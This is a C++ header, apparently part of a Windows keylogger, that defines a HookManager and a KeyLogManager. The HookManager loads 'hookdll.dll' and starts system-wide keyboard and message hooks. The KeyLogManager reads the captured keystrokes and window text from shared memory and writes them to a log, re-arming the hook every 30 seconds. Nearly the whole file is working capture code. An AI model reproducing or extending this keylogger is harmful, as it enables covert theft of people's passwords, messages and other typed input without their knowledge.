#pragma once
#include "tool.h"
#include "Logger.h"
#include "SharedMemory.h"

class HookManager
{
	typedef bool (*HOOK_FN)();
	HMODULE lib;
	HOOK_FN start_message_hook_fn;
	HOOK_FN stop_message_hook_fn;
	HOOK_FN start_keyboard_hook_fn;
	HOOK_FN stop_keyboard_hook_fn;
public:
	HookManager() {
	}
	~HookManager(){
		FreeLibrary(lib);
	}
	static bool get_dll_path(char* path){
		char dll_path[MAX_PATH];
		GetModuleFileName(NULL, dll_path, sizeof(dll_path));
		char *pos = strrchr(dll_path, '\\');
		if(pos == NULL)
			return false;
		strcpy(pos, "\\\0\0");
		strcat(dll_path, "hookdll.dll");
		strcpy(path, dll_path);
		return true;
	}
	bool init(){
		char path[MAX_PATH];
		if(!get_dll_path(path)){
			return false;
		}
		lib = LoadLibrary(path);
		if(!lib){
			Logger::debug("Load Library Fail, %s", path);
			return false;
		}
		(FARPROC &)start_message_hook_fn = GetProcAddress(lib, "start_message_hook");
		(FARPROC &)stop_message_hook_fn = GetProcAddress(lib, "stop_message_hook");
		(FARPROC &)start_keyboard_hook_fn = GetProcAddress(lib, "start_keyboard_hook");
		(FARPROC &)stop_keyboard_hook_fn = GetProcAddress(lib, "stop_keyboard_hook");
		if(!start_message_hook_fn || !stop_message_hook_fn || 
			!start_keyboard_hook_fn || !stop_keyboard_hook_fn){
				return false;
		}
		return true;
	}
	bool start_message_hook(){
		return start_message_hook_fn();
	}
	bool stop_message_hook(){
		return stop_message_hook_fn();
	}
	bool start_keyboard_hook(){
		return start_keyboard_hook_fn();
	}
	bool stop_keyboard_hook(){
		return stop_keyboard_hook_fn();
	}
};

class KeyLogManager
{
	HookManager _hm;
	SharedMemory _sm;
	bool _run;
public:
	KeyLogManager(void):_sm("hook_area"), _run(false){
	}
	~KeyLogManager(void){
	}
	bool init(int tid){
		if(!_sm.create(sizeof(int) + 128)){
			Logger::debug("Create SM Fail");
			return false;
		}
		_sm.write_int(tid);
		if(!_hm.init()){
			Logger::debug("Init Fail");
			return false;
		}
		return true;
	}
	void start(){
		Logger::debug("Start Hook");
		_run = true;
		bool ret = _hm.start_keyboard_hook();
		if(!ret){
			Logger::debug("Start Keyboard Hook Fail, %d", GetLastError());
			_run = false;
		}
		ret = _hm.start_message_hook();
		if(!ret){
			Logger::debug("Start Message Hook Fail, %d", GetLastError());
			_run = false;
		}

		MSG msg;
		time_t last_time = time(NULL);
		while(_run) {
			bool ret = PeekMessage(&msg, NULL, WM_MESSAGE_HOOK, WM_KEYBOARD_HOOK, PM_REMOVE);
			if(ret){
				switch(msg.message){
				case WM_MESSAGE_HOOK:
					log_message(msg);
					break;
				case WM_KEYBOARD_HOOK:
					log_keyboard(msg);
					break;
				default:
					break;
				}
			}
			time_t cur_time = time(NULL);
			if(difftime(cur_time, last_time) > 30){
				_hm.start_message_hook();
				last_time = cur_time;
			}
			Sleep(1);
		}
		Logger::debug("Stop Hook");
		_hm.stop_keyboard_hook();
		_hm.stop_message_hook();
	}
	void stop(){
		_run = false;
	}
	void log_message(MSG& msg)
	{
		char str[128] = {0};
		_sm.read_mem(str, sizeof(int), sizeof(str));
		str[sizeof(str) - 1] = 0;
		str[sizeof(str) - 2] = 0;
		Logger::debug("<%s>", str);
		Logger::write("<%s>", str);
	}
	void log_keyboard(MSG& msg)
	{
		char str[20] = {0};
		_sm.read_mem(str, sizeof(int), sizeof(str));
		str[sizeof(str) - 1] = 0;
		if(str[1] != 0){
			Logger::debug("[%s]", str);
			Logger::write("[%s]", str);
		} else{
			Logger::debug("%s", str);
			Logger::write("%s", str);
		}
	}
};

